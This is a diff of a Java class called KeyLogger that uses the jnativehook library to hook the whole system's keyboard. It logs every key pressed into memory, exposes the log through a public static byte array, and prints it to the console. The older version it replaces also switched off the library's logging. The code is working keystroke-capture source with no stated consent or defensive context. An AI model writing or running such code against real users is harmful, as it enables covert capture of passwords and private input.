@@ -1,36 +1,41 @@
 package com.isee.elfi;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
-import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.nio.charset.StandardCharsets;
-import java.util.logging.Level;
-import java.util.logging.Logger;
 
 public class KeyLogger implements NativeKeyListener {
 
-    private final ByteArrayOutputStream logStream;
+    private ByteArrayOutputStream byteStream;
+    public static byte[] savedBytes;
 
     public KeyLogger() {
-        // Initialize the in-memory stream for logs
-        logStream = new ByteArrayOutputStream();
+        // Initialize the ByteArrayOutputStream
+        byteStream = new ByteArrayOutputStream();
+    }
 
-        // Suppress verbose logging from jnativehook
-        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
-        logger.setLevel(Level.OFF);
-        logger.setUseParentHandlers(false);
+    public byte[] getLogAsBytes() {
+        return byteStream.toByteArray(); // Return the captured log as byte array
     }
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
         try {
-            // Capture the key text and write to the in-memory log
+            // Convert the key to its byte representation
             String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
-            logStream.write((keyText + System.lineSeparator()).getBytes(StandardCharsets.UTF_8));
+            byte[] keyBytes = keyText.getBytes();
+
+            // Write the bytes to the ByteArrayOutputStream
+            byteStream.write(keyBytes);
+            byteStream.write('\n'); // Adding newline for each key press (optional)
+            savedBytes = byteStream.toByteArray();
+
+            // Optionally, print out the bytes for debugging
+            System.out.println(new String(byteStream.toByteArray()));
+
         } catch (IOException ex) {
             ex.printStackTrace();
         }
@@ -38,40 +43,25 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-        // Optional: Handle key release events
+        // No action needed on key release
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
-        // Optional: Handle key typed events
-    }
-
-    public byte[] getLogAsBytes() {
-        // Retrieve the log as a byte array
-        return logStream.toByteArray();
-    }
-
-    public void stopKeyLogger() {
-        try {
-            logStream.close();
-            GlobalScreen.unregisterNativeHook();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        // No action needed on key typed
     }
 
     public void startKeyLogger() {
         try {
-            // Register the global native hook
-            GlobalScreen.registerNativeHook();
-
-            // Add the key logger as a native key listener
-            GlobalScreen.addNativeKeyListener(new KeyLogger());
+            GlobalScreen.registerNativeHook(); // Register the global hook
+            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Add the listener
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
+
 }
+
 
 //import com.github.kwhat.jnativehook.GlobalScreen;
 //import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -80,8 +70,6 @@ public class KeyLogger implements NativeKeyListener {
 //import java.io.BufferedWriter;
 //import java.io.FileWriter;
 //import java.io.IOException;
-//import java.util.logging.Level;
-//import java.util.logging.Logger;
 //
 //public class KeyLogger implements NativeKeyListener {
 //
